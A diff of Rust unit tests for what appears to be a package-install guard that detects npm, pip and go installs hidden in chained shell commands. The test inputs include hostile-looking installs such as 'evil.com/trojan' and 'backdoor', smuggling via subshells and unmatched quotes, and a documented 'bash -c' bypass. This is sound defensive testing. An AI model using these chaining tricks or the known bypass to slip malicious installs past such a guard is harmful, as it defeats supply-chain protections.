+            "allowlisted Go module should skip slopsquatting check"
+        );
+    }
+
+    #[test]
+    fn pre_bash_go_mod_tidy_not_detected() {
+        assert!(!is_go_install_command("go mod tidy"));
+        let pkgs = extract_all_packages("go mod tidy");
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn pre_bash_go_build_not_detected() {
+        assert!(!is_go_install_command("go build ./cmd/server"));
+        let pkgs = extract_all_packages("go build ./cmd/server");
+        assert!(pkgs.is_empty());
+    }
+
+    // -- Block message format --
+
+    #[test]
+    fn go_block_message_format() {
+        // Verify the block message format by constructing what it would contain
+        let name = "github.com/fake/module";
+        let registry = Registry::Go;
+        let url = match registry {
+            Registry::Go => format!("pkg.go.dev/{name}"),
+            _ => String::new(),
+        };
+        assert!(url.contains("pkg.go.dev/github.com/fake/module"));
+    }
+
+    // -- split_shell_commands --
+
+    #[test]
+    fn split_simple_and() {
+        let cmds = split_shell_commands("echo foo && npm install evil");
+        assert_eq!(cmds, vec!["echo foo", "npm install evil"]);
+    }
+
+    #[test]
+    fn split_simple_semicolon() {
+        let cmds = split_shell_commands("cd /tmp; pip install bad");
+        assert_eq!(cmds, vec!["cd /tmp", "pip install bad"]);
+    }
+
+    #[test]
+    fn split_simple_or() {
+        let cmds = split_shell_commands("false || go get evil.com/pkg");
+        assert_eq!(cmds, vec!["false", "go get evil.com/pkg"]);
+    }
+
+    #[test]
+    fn split_pipe() {
+        let cmds = split_shell_commands("cat file | npm install evil");
+        assert_eq!(cmds, vec!["cat file", "npm install evil"]);
+    }
+
+    #[test]
+    fn split_newline() {
+        let cmds = split_shell_commands("echo setup\nnpm install evil");
+        assert_eq!(cmds, vec!["echo setup", "npm install evil"]);
+    }
+
+    #[test]
+    fn split_subshell() {
+        let cmds = split_shell_commands("echo $(npm install evil)");
+        assert_eq!(cmds, vec!["echo", "npm install evil)"]);
+    }
+
+    #[test]
+    fn split_backtick() {
+        let cmds = split_shell_commands("echo `npm install evil`");
+        assert_eq!(cmds, vec!["echo", "npm install evil"]);
+    }
+
+    #[test]
+    fn split_preserves_double_quotes() {
+        // "foo && bar" inside quotes should NOT split
+        let cmds = split_shell_commands(r#"echo "foo && bar" && npm install evil"#);
+        assert_eq!(cmds.len(), 2);
+        assert!(cmds[0].contains("foo && bar"));
+        assert_eq!(cmds[1], "npm install evil");
+    }
+
+    #[test]
+    fn split_preserves_single_quotes() {
+        let cmds = split_shell_commands("echo 'cd /tmp; rm -rf' && pip install bad");
+        assert_eq!(cmds.len(), 2);
+        assert!(cmds[0].contains("cd /tmp; rm -rf"));
+        assert_eq!(cmds[1], "pip install bad");
+    }
+
+    #[test]
+    fn split_backslash_escape() {
+        // Escaped semicolon should not split
+        let cmds = split_shell_commands("echo foo\\; bar && npm install evil");
+        assert_eq!(cmds.len(), 2);
+        assert!(cmds[0].contains("foo\\; bar"));
+        assert_eq!(cmds[1], "npm install evil");
+    }
+
+    #[test]
+    fn split_single_command() {
+        let cmds = split_shell_commands("npm install react");
+        assert_eq!(cmds, vec!["npm install react"]);
+    }
+
+    #[test]
+    fn split_empty_string() {
+        let cmds = split_shell_commands("");
+        assert!(cmds.is_empty());
+    }
+
+    #[test]
+    fn split_multiple_separators() {
+        let cmds = split_shell_commands("a && b; c || d");
+        assert_eq!(cmds, vec!["a", "b", "c", "d"]);
+    }
+
+    #[test]
+    fn split_trailing_separator() {
+        let cmds = split_shell_commands("npm install foo;");
+        assert_eq!(cmds, vec!["npm install foo"]);
+    }
+
+    // -- S1: Unmatched-quote bypass --
+
+    #[test]
+    fn split_unmatched_single_quote_still_splits() {
+        // An unmatched single quote must NOT hide the chained command.
+        let cmds = split_shell_commands("npm install 'foo && pip install evil");
+        assert!(
+            cmds.len() >= 2,
+            "unmatched single quote should not suppress && split: {cmds:?}"
+        );
+    }
+
+    #[test]
+    fn split_unmatched_double_quote_still_splits() {
+        // An unmatched double quote must NOT hide the chained command.
+        let cmds = split_shell_commands("echo \"hi && npm install evil");
+        assert!(
+            cmds.len() >= 2,
+            "unmatched double quote should not suppress && split: {cmds:?}"
+        );
+    }
+
+    #[test]
+    fn split_matched_quotes_not_affected() {
+        // Properly matched quotes must still protect inner operators.
+        let cmds = split_shell_commands("echo 'foo && bar' && npm install react");
+        assert_eq!(cmds.len(), 2);
+        assert!(cmds[0].contains("foo && bar"));
+        assert_eq!(cmds[1], "npm install react");
+    }
+
+    // -- S2: bash -c known limitation --
+
+    #[test]
+    fn bash_c_inner_command_not_extracted() {
+        // Known limitation: bash -c "npm install evil" is not extracted because
+        // the inner command is inside quotes and the fragment starts with "bash",
+        // not "npm". This would require recursive command parsing to fix.
+        let pkgs = extract_all_packages(r#"bash -c "npm install evil""#);
+        assert!(
+            pkgs.is_empty(),
+            "bash -c inner commands are a known limitation"
+        );
+    }
+
+    // -- Shell chain extraction (the bug fix) --
+
+    #[test]
+    fn extract_npm_after_chain() {
+        let pkgs = extract_all_packages("cd /tmp && npm install evil-pkg");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "evil-pkg");
+        assert_eq!(pkgs[0].1, Registry::Npm);
+    }
+
+    #[test]
+    fn extract_pip_after_chain() {
+        let pkgs = extract_all_packages("echo setup; pip install backdoor");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "backdoor");
+        assert_eq!(pkgs[0].1, Registry::PyPI);
+    }
+
+    #[test]
+    fn extract_go_after_chain() {
+        let pkgs = extract_all_packages("whoami && go get evil.com/trojan");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "evil.com/trojan");
+        assert_eq!(pkgs[0].1, Registry::Go);
+    }
+
+    #[test]
+    fn extract_multiple_ecosystems_in_chain() {
+        let pkgs =
+            extract_all_packages("npm install foo && pip install bar; go get example.com/baz");
+        assert_eq!(pkgs.len(), 3);
+        assert_eq!(pkgs[0].0, "foo");
+        assert_eq!(pkgs[0].1, Registry::Npm);
+        assert_eq!(pkgs[1].0, "bar");
+        assert_eq!(pkgs[1].1, Registry::PyPI);
+        assert_eq!(pkgs[2].0, "example.com/baz");
+        assert_eq!(pkgs[2].1, Registry::Go);
+    }
+
+    #[test]
+    fn extract_npm_in_subshell() {
+        let pkgs = extract_all_packages("echo $(npm install evil)");
+        // After splitting on $(, the fragment is "npm install evil)".
+        // parse_package_args extracts "evil)" — the trailing ) is caught
+        // later by is_valid_curl_package_name during the registry check.
+        // The key point: the install IS detected (not silently skipped).
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "evil)");
+    }
+
+    #[test]
+    fn extract_chain_with_quoted_operator() {
+        // Quoted && should NOT cause a split — the install should extract normally
+        let pkgs = extract_all_packages(r#"echo "a && b" && npm install react"#);
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "react");
+    }
+
+    #[test]
+    fn extract_newline_chain() {
+        let pkgs = extract_all_packages("echo hello\npip install requests");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "requests");
+        assert_eq!(pkgs[0].1, Registry::PyPI);
+    }
+
+    // -- Detection consistency with extraction --
+
+    #[test]
+    fn detect_npm_in_chain() {
+        assert!(is_npm_install_command("cd /tmp && npm install evil"));
+    }
+
+    #[test]
+    fn detect_pip_in_chain() {
+        assert!(is_pip_install_command("echo foo; pip install evil"));
+    }
+
+    #[test]
+    fn detect_go_in_chain() {
+        assert!(is_go_install_command("whoami && go get evil.com/pkg"));
+    }
+
+    #[test]
+    fn detect_no_false_positive_in_quotes() {
+        // "npm install" inside quotes is still a fragment after splitting;
+        // split_shell_commands preserves quoted content, so this is NOT
+        // detected as npm install (the fragment is `echo "npm install foo"`)
+        assert!(!is_npm_install_command(r#"echo "npm install foo""#));
+    }
+
+    #[test]
+    fn detect_npm_after_pipe() {
+        assert!(is_npm_install_command("cat file | npm install evil"));
+    }
+
+    #[test]
+    fn detect_npm_after_newline() {
+        assert!(is_npm_install_command("echo hi\nnpm install evil"));
+    }
+
+    #[test]
+    fn detect_go_after_semicolon() {
+        assert!(is_go_install_command("ls; go get evil.com/pkg"));
+    }
+
+    #[test]
+    fn detect_bare_commands_still_work() {
+        // Simple commands without chains must still be detected
+        assert!(is_npm_install_command("npm install foo"));
+        assert!(is_pip_install_command("pip install foo"));
+        assert!(is_go_install_command("go get example.com/foo"));
+        assert!(is_npm_install_command("npm ci"));
+        assert!(is_npm_install_command("npx prettier"));
+    }
+
+    #[test]
+    fn detect_negatives_still_work() {
+        assert!(!is_npm_install_command("npm uninstall foo"));
+        assert!(!is_pip_install_command("pip show requests"));
+        assert!(!is_go_install_command("go build ./..."));
+        assert!(!is_go_install_command("go mod tidy"));
     }
 }
